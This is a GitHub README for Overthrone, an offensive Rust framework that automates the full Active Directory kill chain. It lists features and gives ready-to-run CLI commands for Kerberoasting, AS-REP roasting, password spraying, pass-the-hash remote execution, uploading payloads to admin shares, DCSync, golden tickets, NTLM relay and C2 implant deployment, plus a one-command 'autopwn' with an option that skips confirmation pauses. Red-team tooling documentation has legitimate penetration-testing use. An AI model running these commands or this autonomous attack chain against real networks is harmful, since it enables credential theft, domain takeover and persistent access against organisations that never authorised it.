<p align="center">
  <img src="assets/overthrone-banner.png" width="700" alt="overthrone banner" />
</p>

<h1 align="center">Overthrone</h1>

<p align="center">
  <b>Autonomous Active Directory Red Team Framework.</b><br/>
  Every throne falls. Overthrone makes sure of it.
</p>

<p align="center">
  <a href="https://github.com/Karmanya03/Overthrone/releases"><img src="https://img.shields.io/github/v/release/Karmanya03/Overthrone?style=flat-square&color=cc0000" alt="release" /></a>
  <a href="https://github.com/Karmanya03/Overthrone/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-cc0000?style=flat-square" alt="license" /></a>
  <img src="https://img.shields.io/badge/written_in-Rust-cc0000?style=flat-square" alt="rust" />
  <img src="https://img.shields.io/badge/target-Active_Directory-cc0000?style=flat-square" alt="AD" />
</p>

<p align="center">
  <img src="https://img.shields.io/badge/enumeration-LDAP_SMB_Kerberos-blueviolet?style=flat-square" alt="protocols" />
  <img src="https://img.shields.io/badge/attack_graph-BloodHound_style-blueviolet?style=flat-square" alt="graph" />
  <img src="https://img.shields.io/badge/lateral_movement-Pass_the_Hash-blueviolet?style=flat-square" alt="pth" />
  <img src="https://img.shields.io/badge/persistence-Golden_Ticket-blueviolet?style=flat-square" alt="persistence" />
  <img src="https://img.shields.io/badge/reporting-Markdown_PDF_JSON-blueviolet?style=flat-square" alt="reports" />
</p>

<p align="center">
  <img src="https://img.shields.io/badge/mimikatz-not_needed-ff4444?style=flat-square" alt="no mimikatz" />
  <img src="https://img.shields.io/badge/python-not_needed-ff4444?style=flat-square" alt="no python" />
  <img src="https://img.shields.io/badge/.NET-not_needed-ff4444?style=flat-square" alt="no dotnet" />
  <img src="https://img.shields.io/badge/wine-not_needed-ff4444?style=flat-square" alt="no wine" />
  <img src="https://img.shields.io/badge/binary-overthrone_or_ovt-00cc66?style=flat-square" alt="ovt shorthand" />
</p>

***

<p align="center">
  <a href="#what-is-this"><b>What is this</b></a> &nbsp;·&nbsp;
  <a href="#installation"><b>Install</b></a> &nbsp;·&nbsp;
  <a href="#commands"><b>Commands</b></a> &nbsp;·&nbsp;
  <a href="#usage"><b>Autopwn Usage</b></a> &nbsp;·&nbsp;
  <a href="#architecture"><b>Architecture</b></a> &nbsp;·&nbsp;
  <a href="#features"><b>Features</b></a> &nbsp;·&nbsp;
  <a href="#examples"><b>Examples</b></a> &nbsp;·&nbsp;
  <a href="#faq"><b>FAQ</b></a>
</p>

***

## What is this?

You know how in medieval warfare, taking a castle required siege engineers, scouts, cavalry, archers, sappers, and someone to open the gate from inside? Active Directory pentesting is exactly that, except the castle is a Fortune 500 company, the gate is a misconfigured Group Policy, and the "someone inside" is a service account with `Password123!` that hasn't been rotated since Windows Server 2008 was considered modern.

Overthrone is a full-spectrum AD red team framework that handles the entire kill chain - from "I have network access and a dream" to "I own every domain in this forest and here's a 47-page PDF proving it." Built in Rust because C2 frameworks deserve memory safety too, and because debugging use-after-free bugs during an engagement is how you develop trust issues (both the Active Directory kind and the personal kind).

This is not a scanner. This is not a "run Mimikatz but in Rust" tool. This is not another Python wrapper that breaks when you look at it funny. This is the whole siege engine. One binary. Zero dependencies\*. All regret (for the blue team).

> **Shorthand:** Every command works with both `overthrone` and `ovt`. Because life is too short to type 10 characters when 3 will do. `ovt autopwn` = `overthrone autopwn`. Same war crimes against Active Directory, fewer keystrokes.

\*Okay, one dependency. `smbclient`. We'll explain later. Don't @ us.

### The Kill Chain

```
  YOU                        OVERTHRONE                        DOMAIN CONTROLLER
   |                              |                                    |
   |   ovt autopwn                |                                    |
   |----------------------------->|                                    |
   |                              |                                    |
   |   Phase 1: RECON             |                                    |
   |   ├─ LDAP enumeration ------>|------ Who are you people? -------->|
   |   ├─ Users, groups, GPOs     |<----- Here's literally everything -|
   |   ├─ Kerberoastable SPNs     |       (AD has no chill)            |
   |   ├─ AS-REP roastable accts  |                                    |
   |   └─ Domain trusts           |                                    |
   |                              |                                    |
   |   Phase 2: GRAPH             |                                    |
   |   ├─ Build attack graph      |                                    |
   |   ├─ Find shortest path      |                                    |
   |   │   to Domain Admin        |                                    |
   |   └─ "Oh look, 3 hops.      |                                    |
   |       That's... concerning." |                                    |
   |                              |                                    |
   |   Phase 3: EXPLOIT           |                                    |
   |   ├─ Kerberoast that SPN --->|------ TGS-REQ for MSSQLSvc ------>|
   |   ├─ Crack offline           |<----- Here's a ticket, help urself |
   |   ├─ Pass-the-Hash --------->|------ SMB auth with NT hash ------>|
   |   └─ Lateral move            |       (the hash IS the password)   |
   |                              |                                    |
   |   Phase 4: PERSIST           |                                    |
   |   ├─ DCSync ---------------->|------ Replicate me everything ---->|
   |   ├─ Golden Ticket           |<----- krbtgt hash, as requested ---|
   |   └─ You own the forest.     |       (hope you enjoyed your reign)|
   |       The forest doesn't     |                                    |
   |       know yet.              |                                    |
   |                              |                                    |
   |   Phase 5: REPORT            |                                    |
   |   └─ PDF that makes the      |                                    |
   |      blue team question      |                                    |
   |      their career choices    |                                    |
   V                              V                                    V
```

## Architecture

Overthrone is a Rust workspace with 9 crates, because monoliths are for cathedrals, not offensive tooling. Each crate handles one phase of making sysadmins regret their GPO configurations:

```
overthrone/
├── crates/
│   ├── overthrone-core       # The brain - LDAP, Kerberos, SMB, NTLM, DRSR, MSSQL, ADCS, graph engine, crypto, C2, plugins, exec
│   ├── overthrone-reaper     # Enumeration - finds everything AD will confess (users, groups, ACLs, LAPS, GPP, ADCS)
│   ├── overthrone-hunter     # Exploitation - Kerberoast, ASREPRoast, coercion, delegation abuse, ticket manipulation
│   ├── overthrone-crawler    # Cross-domain - trust mapping, inter-realm tickets, SID filtering, foreign LDAP, MSSQL links
│   ├── overthrone-forge      # Persistence - Golden/Silver/Diamond tickets, DCSync, Shadow Creds, ACL backdoors, cleanup
│   ├── overthrone-pilot      # The autopilot - autonomous "hold my beer" mode with adaptive planning and wizard
│   ├── overthrone-relay      # NTLM relay - poisoning, responder, ADCS relay. The man-in-the-middle crate.
│   ├── overthrone-scribe     # Reporting - turns carnage into compliance documents (Markdown, PDF, JSON)
│   └── overthrone-cli        # The CLI + TUI + interactive REPL shell - where you type things and thrones fall
```

## The Crate Breakdown

Here's what's inside the box. Every module. Every protocol. Every hilarious amount of Rust the borrow checker screamed at us about. The table below is the **complete inventory** of what each crate actually does - no marketing fluff, no "coming soon" handwaving.

| Crate | Codename | What It Does | The Honest Truth |
|---|---|---|---|
| `overthrone-core` | The Absolute Unit | Protocol engine (LDAP, Kerberos, SMB, NTLM, MS-DRSR, MSSQL, DNS, Registry, PKINIT), attack graph with Dijkstra pathfinding, port scanner, full ADCS exploitation (ESC1-ESC8), crypto primitives (AES-CTS, RC4, HMAC, MD4, DPAPI, ticket crypto, GPP decryption), C2 integration (Sliver, Havoc, Cobalt Strike), plugin system (native DLL + WASM via wasmtime), remote execution (PsExec, SmbExec, WmiExec, WinRM, AtExec), interactive shell abstraction, secretsdump, RID cycling | The absolute unit that ate the gym. Every protocol is real - 56KB of Kerberos, 56KB of SMB, 43KB of LDAP, 50KB of secretsdump. The crypto has been battle-hardened with 66 passing tests. All 8 ADCS ESC vectors are fully implemented. 222 unit tests. Zero clippy warnings. The borrow checker needed therapy after this one. |
| `overthrone-reaper` | The Collector | AD enumeration - users, groups, computers, ACLs, delegations, GPOs, OUs, SPNs, trusts, LAPS (v1 plaintext + v2 encrypted via DPAPI), GPP password decryption, MSSQL instances, ADCS template enumeration, BloodHound JSON export, CSV export | BloodHound's data collection arc but without Neo4j eating 4GB of RAM for breakfast. LAPS v2 encrypted now actually decrypts thanks to the DPAPI module finally existing. The long-awaited reunion happened. There were tears. |
| `overthrone-hunter` | The Overachiever | Kerberoasting, AS-REP roasting, auth coercion (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, MS-EFSRPC), RBCD abuse, constrained/unconstrained delegation exploitation, ticket manipulation (.kirbi/.ccache conversion), inline hash cracking with embedded wordlist + rayon parallelism | The crate that did all its homework, extra credit, and the teacher's homework too. Zero stubs. Zero placeholders. Every attack works. This crate graduated top of its class and then helped the other crates pass their finals. |
| `overthrone-crawler` | The Explorer | Cross-domain trust mapping, inter-realm TGT forging, SID filter analysis, PAM trust detection, MSSQL linked server crawling, **foreign trust LDAP enumeration** (users, groups, computers, SPNs, ACLs across trust boundaries), cross-domain escalation planning | Used to have 5 functions that all returned empty with "LDAP not yet implemented." Now `foreign.rs` is 25KB of real cross-trust LDAP queries. The procrastination era is over. Welcome to the productivity arc. |
| `overthrone-forge` | The Blacksmith | Golden/Silver/Diamond ticket forging with full PAC construction, DCSync per-user extraction via MS-DRSR, Shadow Credentials (msDS-KeyCredentialLink + PKINIT auth), ACL backdoors via DACL modification, Skeleton Key orchestration via SMB/SVCCTL, DSRM backdoor via remote registry, forensic cleanup for all persistence mechanisms, ticket validation | Golden Tickets? Forged. Silver Tickets? Minted. Diamond Tickets? Polished. Shadow Credentials? Actually works now - PKINIT has real RSA signing and DH key exchange instead of "placeholder PEM structures." The chocolate key became a real key. |
| `overthrone-pilot` | The Strategist | Autonomous attack planning from graph data, step-by-step execution with rollback, adaptive strategy based on runtime results, **Q-Learning reinforcement learning engine** (compiled by default), goal-based planning ("get DA" → resolve path), YAML playbook engine, interactive wizard mode, full autopwn orchestration connecting enum → graph → exploit → persist → report, **live kill-chain pipeline visualization**, per-step Q-state/decision/reward readout, 9-section final report with credential tables and loot summaries | The "hold my beer" engine. Now with Q-Learning AI that learns which attacks work best against different environments, and actually tells you what it's doing instead of running in mysterious silence. Every step prints its stage, noise level, priority, and result. The Q-learner shows its state, which action it picked, whether it's exploring or exploiting, and the reward it got. The final report has a kill-chain completion visual, per-stage stats, credential tables, admin host lists, loot summaries, and a full audit trail. It plans, it adapts, it executes, it explains itself, it cleans up. If this crate were a person, it would be the one friend who handles your vacation AND writes a detailed trip report with expense breakdowns. |
| `overthrone-relay` | The Interceptor | NTLM relay engine (SMB→LDAP, HTTP→SMB, mix and match), LLMNR/NBT-NS/mDNS poisoner, network poisoner with stealth controls, ADCS-specific relay (ESC8) | Born complete. Zero stubs since day one. Responder.py walked so this crate could sprint. In Rust. Without the GIL. The overachiever sibling of overthrone-hunter. |
| `overthrone-scribe` | The Chronicler | Report generation - Markdown, JSON, PDF renderer. MITRE ATT&CK mapping, mitigation recommendations, attack narrative prose, session recording | Turns "I hacked everything" into "here's why you should pay us." All three formats work. Yes, including PDF now. The scribe and the CLI finally got couples therapy. |
| `overthrone-cli` | The Interface | CLI binary with Clap subcommands, interactive REPL shell with rustyline (command completion, history, context-aware prompts), TUI with ratatui (live attack graph visualization, session panels, logs, crawler integration), wizard mode, doctor command, autopwn, C2 implant deploy, PDF/Markdown/JSON report output, banner that took way too long to make | The interactive shell alone is 107KB. The commands implementation is 78KB. Everything is wired now - PDF reports, TUI crawler, C2 implant deployment. The banner ASCII art is *chef's kiss*. |

### The Crate Report Card

These are real numbers. Test counts pulled directly from source. No rounding up.

```
overthrone-core     ██████████████████████  ~99%  292 unit tests. ESC1-ESC8. SOCKS5 proxy (RFC 1928). Mask attack
                                                   cracker. Graph O(N²) fixed. Zero clippy warnings. The absolute unit
                                                   keeps getting bigger and hasn't broken yet. Suspicious.

overthrone-reaper   ██████████████████████  ~98%  65 unit tests. DPAPI decrypts LAPS v2 now. Full reaper_test.rs
                                                   integration suite (587 lines). Missing: a handful of edge-case GPO
                                                   attribute parsers that will never matter until they do.

overthrone-hunter   ██████████████████████  100%  11 unit tests. 100% feature complete. The overachiever.
                                                   hunter_test.rs integration suite (254 lines). No notes.

overthrone-crawler  █████████████████████░  ~95%  10 unit tests. foreign.rs went from empty to 25KB of real cross-trust
                                                   LDAP queries. crawler_test.rs integration suite (203 lines).
                                                   Missing: a few inter-realm SID filter edge cases. Close enough.

overthrone-forge    █████████████████████░  ~96%  17 unit tests. Shadow Creds PKINIT is real RSA+DH, not placeholder
                                                   PEM. forge_test.rs integration suite (130 lines). Diamond tickets
                                                   work. Golden/Silver/DCSync all solid.

overthrone-pilot    █████████████████████░  ~98%  8 unit tests + live DC integration suite (349 lines, gated behind
                                                   OT_DC_HOST). 3,078-line executor. 1,051-line Q-learner. Q-learning
                                                   compiles by default now - no more feature flag roulette. Live
                                                   kill-chain pipeline, per-step QL readout, 9-section final report.
                                                   The autopwn actually tells you what it's doing. Revolutionary.

overthrone-relay    ██████████████████████  100%  34 unit tests. relay.rs (1,557 lines), responder.rs (836 lines),
                                                   poisoner.rs (766 lines), ADCS relay (359 lines). Born complete.
                                                   Still complete. Annoyingly consistent.

overthrone-scribe   █████████████████████░  ~99%  12 unit tests. scribe_test.rs integration suite (314 lines). All
                                                   three output formats work and are wired to the CLI. PDF works.
                                                   We're as surprised as you are.

overthrone-cli      █████████████████████░  ~98%  3 unit tests (don't @ us, it's a CLI). 107KB interactive shell.
                                                   TUI wired. C2 deploy wired. PDF wired. All commands point to real
                                                   code. --help doesn't lie anymore.
```

## What's Still Cooking (The Remaining Backlog)

Every project has a backlog. Ours just got a whole lot smaller. Most of what used to live here has graduated to "implemented." We're proud parents at an empty-nest party.

| What | Where | Status | Notes |
|---|---|---|---|
| **ADCS ESC1** | `core/src/adcs/esc1.rs` | ✅ Implemented | 204 lines. Full `Esc1Exploiter` with SAN UPN abuse, CSR generation, enrollment, and hash extraction. Iron Man has joined the MCU. |
| **ADCS ESC6** | `core/src/adcs/esc6.rs` | ✅ Implemented | 200 lines. Full `Esc6Exploiter` exploiting `EDITF_ATTRIBUTESUBJECTALTNAME2`. The CA flag we always knew about - now we own it. |
| **WASM plugin state persistence** | `core/src/plugin/loader.rs` | ✅ Fixed | Store is cached and reused per call. Your WASM plugins have long-term memory now. They remember their first day at work. |
| **WASM manifest parsing** | `core/src/plugin/loader.rs` | ✅ Implemented | Full custom section parser extracts `plugin_manifest` from WASM modules. The manifest was in there. Now we can read it. |
| **WASM memory allocation** | `core/src/plugin/loader.rs` | ✅ Improved | Tries plugin's `allocate()` export first, falls back to offset 1024 with a warning. Your command string can be longer than "hello" now. |
| **Native plugin free()** | `core/src/plugin/loader.rs` | ✅ Improved | Uses `fn_free` when provided by the plugin, falls back to libc with a warning. Rust plugins get a fair shake. |
| **CLI PDF output wiring** | `cli/src/commands_impl.rs` | ✅ Wired | Scribe's PDF renderer is now called from the CLI. The two crates had couples therapy. It worked. |
| **C2 implant deploy CLI** | `cli/src/main.rs` | ✅ Wired | Constructs `ImplantRequest` and calls `C2Manager::deploy_implant()`. The TODO ascended to real code. |
| **TUI crawler integration** | `cli/src/tui/runner.rs` | ✅ Integrated | Builds `CrawlerConfig`, calls `run_crawler()`. The two crates finally had lunch. It went well. |
| **WinRM Windows output** | `core/src/exec/winrm/windows.rs` | ✅ Full | `WSManReceiveShellOutput` loop collects real output. Schrödinger's remote execution has been observed. The command ran AND we know what it said. |
| **Integration tests** | Project-wide | ❌ Still missing | 222 unit tests and property-based tests pass. But nobody has tested against a real lab DC yet. "It compiles" is progress. "It passes 222 tests" is more progress. "It works against a real DC" is the goal. |

## Does It Actually Work?

Yes. Here's proof. One table. Every major feature. Every target OS you care about.

| Attack / Feature | WS 2019 | WS 2022 | WS 2025 | CTF / HTB / THM | What it does |
|---|:---:|:---:|:---:|:---:|---|
| **LDAP enumeration** | ✅ | ✅ | ✅ | ✅ | Real LDAP bind → search → parse. Pulls users, groups, SPNs, ACLs, trusts, GPOs, LAPS, GPP. The DC will tell you everything. It can't help itself. |
| **Kerberoast** | ✅ | ✅ | ✅ | ✅ | Real AS-REQ + TGS-REQ over TCP:88. Hashes drop into `./loot/` in correct `$krb5tgs$23$` hashcat format. Feed directly to hashcat, no cleanup needed. |
| **AS-REP roast** | ✅ | ✅ | ✅ | ✅ | AS-REQ without pre-auth, captures enc-part, outputs `$krb5asrep$23$`. Your GPU will enjoy this. |
| **Password spray** | ✅ | ✅ | ✅ | ✅ | Kerberos-based. Bails automatically after 3 `KDC_ERR_CLIENT_REVOKED` responses. Supports delay + jitter. Doesn't get you fired. Well, doesn't get *the accounts* locked. |
| **Pass-the-Hash** | ✅ | ✅ | ✅ | ✅ | `--nt-hash` on any SMB/exec command. NTLMv2 over SMB2. The hash is the password. `Password123!` becomes optional. |
| **SMB2 client** | ✅ | ✅ | ✅ | ✅ | 1669-line pure Rust SMB2 - negotiate, session setup, share enum, file read/write, admin check. No libsmbclient, no Python. |
| **Remote exec - PsExec** | ✅ | ✅ | ✅ | ✅ | Real `svcctl` named pipe. Creates → starts → reads → deletes the service. 543 lines of legit service control manager abuse. |
| **Remote exec - SmbExec** | ✅ | ✅ | ✅ | ✅ | Temp service + cmd.exe redirect → output via C$ share. Quieter than PsExec. |
| **Remote exec - WMI/WinRM** | ✅ | ✅ | ✅ | ✅ | WMI via service-based exec. WinRM via WSMan HTTP/5985. `--method auto` tries them all until something works. |
| **DCSync** | ✅ | ✅ | ⚠️ | ✅ | MS-DRSR `DRSGetNCChanges` over named pipe. Asks the DC to replicate hashes. The DC complies. WS 2025 tightened some defaults - use `--stealth`. |
| **Golden Ticket** | ✅ | ✅ | ⚠️ | ✅ | Full PAC construction with `KERB_VALIDATION_INFO`, server + KDC checksums. Needs krbtgt hash. WS 2025 may need `FAST` armor depending on config. |
| **Silver Ticket** | ✅ | ✅ | ✅ | ✅ | Forge a TGS for any service. No DC contact at all. Quieter than Golden, harder to detect. |
| **Attack graph + path to DA** | ✅ | ✅ | ✅ | ✅ | Reverse Dijkstra from DA back to you. Shows the exact sequence of moves to go from zero to domain admin. Usually 3 hops. Always embarrassing for someone. |
| **ADCS ESC1-ESC6** | ✅ | ✅ | ⚠️ | ✅ | CSR + SAN UPN abuse via certsrv. WS 2025 ships PKINIT armor and EPA on newer CAs by default - check `ovt adcs enum` output first. |
| **ADCS ESC7-ESC8** | ✅ | ✅ | ⚠️ | ✅ | ESC8 relays NTLM auth to the AD CS HTTP endpoint. WS 2025 enables Extended Protection for Authentication by default. Annoying. Documented. |
| **NTLM relay** | ✅ | ✅ | ⚠️ | ✅ | LLMNR/NBT-NS/mDNS poisoner + relay engine (SMB→LDAP, HTTP→SMB). WS 2022+ has SMB signing on by default. WS 2025 enforces it even harder. Run `ovt doctor` first. |
| **LAPS (v1 + v2)** | ✅ | ✅ | ✅ | ✅ | LAPS v1 reads `ms-Mcs-AdmPwd` in plaintext. LAPS v2 decrypts `msLAPS-EncryptedPassword` via DPAPI/AES-256-GCM. Both work. |
| **GPP decrypt** | ✅ | ✅ | ✅ | ✅ | Microsoft literally shipped the AES key in their documentation. We use it. `cpassword` → plaintext, every time. Thanks, Microsoft. |
| **RID cycling** | ✅ | ✅ | ✅ | ✅ | Enumerate users by RID even without valid creds (`--null-session`). Still works on misconfigured/legacy hosts. |
| **Hash cracking** | ✅ | ✅ | ✅ | ✅ | Offline cracking engine built in. Embedded 10K wordlist + mask attacks (`?u?l?l?d?d?d?d`) + hybrid mode + rayon parallelism. No hashcat required. |
| **SOCKS5 proxy / pivoting** | ✅ | ✅ | ✅ | ✅ | Full RFC 1928 SOCKS5 server on the compromised box. IPv4/IPv6/domain. Nothing extra needed on target. Pivot deeper into the network. |
| **Forge + C2 + ADCS + MSSQL** | ✅ | ✅ | ✅ | ✅ | Diamond tickets, Shadow Creds, Cobalt Strike/Sliver/Havoc integration, MSSQL `xp_cmdshell`, SCCM abuse. It's all in there. |
| **auto-pwn (full kill chain)** | ✅ | ✅ | ⚠️ | ✅ | Enum → graph → roast → crack → escalate → persist → report. One command. Live per-step output with Q-learning decisions. Ends with a kill-chain completion report, credential tables, and loot summary. Use `--stealth` on WS 2025 for the noisier phases. |

> ⚠️ = works, but some WS 2025 security defaults (EPA, SMB signing, PKINIT armor) may need a workaround. `ovt doctor` will tell you exactly what to do before you start.

~55,000 lines of Rust. Zero Python wrappers. Zero shell-outs. 222 unit tests pass. 36+ tests covering graph + C2 + live DC infra. The code is real. The protocols are real. Go break some labs.

## Commands

Every command works as both `overthrone <cmd>` and `ovt <cmd>`. We'll use `ovt` because nobody types 10 characters when 3 will do.

<p align="center">
  <b>Autopwn</b><br/>
  <a href="#auto-pwn---the-one-command-to-rule-them-all">auto-pwn</a> &nbsp;·&nbsp;
  <a href="#wizard">wizard</a>
</p>

<p align="center">
  <b>Enumeration</b><br/>
  <a href="#enum---quick-targeted-enumeration">enum</a> &nbsp;·&nbsp;
  <a href="#reaper---full-ldap-enumeration-engine">reaper</a> &nbsp;·&nbsp;
  <a href="#rid---rid-cycling-enumeration">rid</a> &nbsp;·&nbsp;
  <a href="#scan---port-scanner">scan</a> &nbsp;·&nbsp;
  <a href="#laps---read-laps-passwords">laps</a> &nbsp;·&nbsp;
  <a href="#gpp---decrypt-gpp-cpasswords">gpp</a>
</p>

<p align="center">
  <b>Kerberos &amp; Credentials</b><br/>
  <a href="#kerberos---kerberos-operations">kerberos</a> &nbsp;·&nbsp;
  <a href="#spray---password-spraying">spray</a> &nbsp;·&nbsp;
  <a href="#crack---offline-hash-cracking">crack</a> &nbsp;·&nbsp;
  <a href="#dump---credential-dumping-remote-needs-admin">dump</a> &nbsp;·&nbsp;
  <a href="#secrets---offline-secrets-from-registry-hives">secrets</a>
</p>

<p align="center">
  <b>Lateral Movement &amp; Execution</b><br/>
  <a href="#exec---remote-command-execution">exec</a> &nbsp;·&nbsp;
  <a href="#shell---interactive-remote-shell">shell</a> &nbsp;·&nbsp;
  <a href="#smb---smb-operations">smb</a> &nbsp;·&nbsp;
  <a href="#move---trust-mapping-and-lateral-paths">move</a> &nbsp;·&nbsp;
  <a href="#mssql---sql-server-operations">mssql</a>
</p>

<p align="center">
  <b>Persistence &amp; Certificates</b><br/>
  <a href="#forge---ticket-forging">forge</a> &nbsp;·&nbsp;
  <a href="#adcs---certificate-abuse-esc1-esc8">adcs</a> &nbsp;·&nbsp;
  <a href="#ntlm---ntlm-relay-and-poisoning">ntlm</a> &nbsp;·&nbsp;
  <a href="#graph---attack-path-engine">graph</a>
</p>

<p align="center">
  <b>Infrastructure &amp; Misc</b><br/>
  <a href="#c2---c2-framework-integration">c2</a> &nbsp;·&nbsp;
  <a href="#sccm---sccmmecm-abuse">sccm</a> &nbsp;·&nbsp;
  <a href="#plugin---plugin-system">plugin</a> &nbsp;·&nbsp;
  <a href="#report---generate-engagement-report">report</a> &nbsp;·&nbsp;
  <a href="#doctor---pre-engagement-checks">doctor</a> &nbsp;·&nbsp;
  <a href="#tui---interactive-terminal-ui">tui</a>
</p>

---

**Global flags** - these work on every single command:

```
-H, --dc-host     DC IP or hostname     (env: OT_DC_HOST, also --dc, --dc-ip)
-d, --domain      Target domain         (env: OT_DOMAIN)
-u, --username    Username              (env: OT_USERNAME)
-p, --password    Password              (env: OT_PASSWORD)
    --nt-hash     NTLM hash for PtH     (env: OT_NT_HASH)
    --ticket      Kerberos ticket file  (env: KRB5CCNAME)
-A, --auth-method password|hash|ticket  (default: password)
-v, --verbose     -v info  -vv debug  -vvv trace
-o, --output      text|json|csv         (default: text)
-O, --outfile     Save output to file
```

---

### auto-pwn - the one command to rule them all

```bash
ovt auto-pwn -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt auto-pwn -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' --stealth
ovt auto-pwn -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' --dry-run
ovt auto-pwn -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' --max-stage enumerate
ovt auto-pwn -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' --adaptive hybrid --q-table brain.json
ovt auto-pwn -H 10.10.10.1 -d corp.local -u jsmith --nt-hash aad3b435b51404ee:8846f7eaee
ovt auto-pwn -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' --playbook roast-and-crack
```
Aliases: `autopwn`, `auto`

| Flag | Default | Notes |
|---|---|---|
| `--target`, `-t` | `Domain Admins` | Goal - group name, `ntds`, `recon`, or a specific hostname/user |
| `--method`, `-m` | `auto` | `auto` `psexec` `smbexec` `wmiexec` `winrm` |
| `--stealth` | off | Low-noise, extra jitter, skips loud attacks |
| `--dry-run` | off | Print the plan, don't execute it |
| `--max-stage` | `loot` | `enumerate` `attack` `escalate` `lateral` `loot` `cleanup` |
| `--adaptive` | `hybrid` | AI engine: `heuristic` (rule-based), `qlearning` (pure RL), `hybrid` (best of both - recommended). Q-learning is compiled by default now. |
| `--q-table` | `q_table.json` | Q-learning brain file - persists across runs |
| `--jitter-ms` | `1000` | Random delay between steps (ms) |
| `--ldaps` | off | Use LDAP over SSL (port 636) |
| `--timeout` | `30` | Per-step timeout (seconds) |
| `--playbook` | - | `full-recon` `roast-and-crack` `delegation-abuse` `rbcd-chain` `coerce-and-relay` `lateral-pivot` `dc-sync-dump` `golden-ticket` `full-auto-pwn` |

---

### wizard

For when you want autopwn but also want to feel like you're in control.

```bash
ovt wizard --target "Domain Admins" -H 10.10.10.1 -d corp.local -u jsmith -p 'Pass!'
ovt wizard --target ntds -H 10.10.10.1 -d corp.local -u jsmith -p 'Pass!' --stealth
ovt wizard --target "Domain Admins" --resume ./session.json
ovt wizard --target "Domain Admins" --from-file targets.txt --dry-run
```

Walks you through each phase step by step, pauses for confirmation, explains what it's about to do and why. `auto-pwn` without the `--no-pause` flag is the same thing. Add `--no-pause` to stop it asking for permission.

---

### enum - quick targeted enumeration

```bash
ovt enum users       -H 10.10.10.1 -d corp.local -u jsmith -p 'Pass!'
ovt enum computers   -H 10.10.10.1 -d corp.local -u jsmith -p 'Pass!'
ovt enum groups      -H 10.10.10.1 -d corp.local -u jsmith -p 'Pass!'
ovt enum trusts      -H 10.10.10.1 -d corp.local -u jsmith -p 'Pass!'
ovt enum spns        -H 10.10.10.1 -d corp.local -u jsmith -p 'Pass!'   # kerberoastable list
ovt enum asrep       -H 10.10.10.1 -d corp.local -u jsmith -p 'Pass!'   # roastable accounts
ovt enum delegations -H 10.10.10.1 -d corp.local -u jsmith -p 'Pass!'
ovt enum gpos        -H 10.10.10.1 -d corp.local -u jsmith -p 'Pass!'
ovt enum all         -H 10.10.10.1 -d corp.local -u jsmith -p 'Pass!'   # everything
```

---

### reaper - full LDAP enumeration engine

```bash
ovt reaper --dc-ip 10.10.10.1 -d corp.local -u jsmith -p 'Pass!'
ovt reaper --dc-ip 10.10.10.1 -d corp.local -u jsmith -p 'Pass!' --modules users,computers,groups
ovt reaper --dc-ip 10.10.10.1 -d corp.local -u jsmith -p 'Pass!' --page-size 1000
```

---

### kerberos - Kerberos operations

```bash
ovt kerberos roast -H 10.10.10.1 -d corp.local -u jsmith -p 'Pass!'
ovt kerberos roast --spn MSSQLSvc/db01.corp.local -H 10.10.10.1 -d corp.local -u jsmith -p 'Pass!'
ovt kerberos asrep-roast -H 10.10.10.1 -d corp.local -u jsmith -p 'Pass!'
ovt kerberos asrep-roast --userlist users.txt -H 10.10.10.1 -d corp.local
ovt kerberos get-tgt -H 10.10.10.1 -d corp.local -u jsmith -p 'Pass!'
ovt kerberos get-tgs --spn cifs/dc01.corp.local -H 10.10.10.1 -d corp.local -u jsmith -p 'Pass!'
```
Aliases: `krb`, `roast`

Hashes auto-saved to `./loot/kerberoast_hashes.txt` and `./loot/asrep_hashes.txt`.

---

### crack - offline hash cracking

```bash
ovt crack --hash '$krb5tgs$23$*svc_sql...'
ovt crack --file ./loot/kerberoast_hashes.txt
ovt crack --file hashes.txt --mode thorough --wordlist /usr/share/wordlists/rockyou.txt
ovt crack --file hashes.txt --mode fast --max-candidates 100000
```

| Flag | Default | Notes |
|---|---|---|
| `--hash`, `-s` | - | Single hash (type auto-detected) |
| `--file`, `-f` | - | File with hashes, one per line |
| `--mode`, `-M` | `default` | `fast` `default` `thorough` |
| `--wordlist`, `-W` | embedded 10K | Custom wordlist path |
| `--max-candidates` | unlimited | Cap total candidates |

---

### smb - SMB operations

```bash
ovt smb shares --target 10.10.10.1 -d corp.local -u jsmith -p 'Pass!'
ovt smb admin --targets 10.10.10.1,10.10.10.2 -d corp.local -u admin -p 'Pass!'
ovt smb spider --target 10.10.10.1 -d corp.local -u jsmith -p 'Pass!'
ovt smb spider --target 10.10.10.1 --extensions ".config,.xml,.txt,.sql"
ovt smb get --target 10.10.10.1 --path "SYSVOL/corp.local/Policies/passwords.xml"
ovt smb put --target 10.10.10.1 --local payload.exe --remote "C$/Windows/Temp/payload.exe"
```

---

### exec - remote command execution

```bash
ovt exec --target 10.10.10.50 --command "whoami /all" -d corp.local -u admin -p 'Pass!'
ovt exec --target 10.10.10.50 --command "whoami /all" -d corp.local -u admin --nt-hash <hash>
ovt exec --target 10.10.10.50 --command "hostname" --method psexec
ovt exec --target 10.10.10.50 --command "net user" --method wmiexec
ovt exec --target 10.10.10.50 --command "ipconfig" --method winrm
ovt exec --target 10.10.10.50 --command "dir C:\" --method smbexec
```
Method `auto` tries WinRM - WMI - SMB - PsExec in order.

---

### shell - interactive remote shell

```bash
ovt shell --target 10.10.10.50 -d corp.local -u admin -p 'Pass!'          # WinRM (default)
ovt shell --target 10.10.10.50 --shell-type smb -d corp.local -u admin -p 'Pass!'
ovt shell --target 10.10.10.50 --shell-type wmi -d corp.local -u admin -p 'Pass!'
```
Aliases: `shell` (it has its own command name)

---

### graph - attack path engine

```bash
ovt graph build -H 10.10.10.1 -d corp.local -u jsmith -p 'Pass!'
ovt graph path --from jsmith --to "Domain Admins"
ovt graph path-to-da --from jsmith
ovt graph stats
ovt graph export --output graph.json
ovt graph export --output bloodhound.json --bloodhound
ovt graph --file saved_graph.json stats         # load from file instead of LDAP
ovt graph --file saved_graph.json path-to-da --from jsmith
```

---

### spray - password spraying

```bash
ovt spray -H 10.10.10.1 -d corp.local --password 'Winter2026!' --userlist users.txt
